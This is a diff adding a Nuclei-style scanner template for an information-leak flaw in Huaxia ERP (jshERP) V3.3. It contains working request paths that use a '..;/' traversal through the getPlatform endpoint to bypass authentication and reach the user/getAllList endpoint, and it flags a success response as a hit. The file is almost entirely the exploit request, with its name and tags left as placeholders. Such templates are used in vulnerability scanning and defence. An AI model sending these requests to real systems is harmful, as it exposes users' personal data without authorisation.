@@ -1,0 +1,20 @@
+id: jserp-getPlatform-info
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 华夏ERPV3.3存在信息泄漏漏洞，可获取用户敏感信息。
+  reference:
+    - https://mp.weixin.qq.com/s/c12Frd6hp0a3r8A9-lVr-g
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList"
+      - "{{BaseURL}}/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":200'
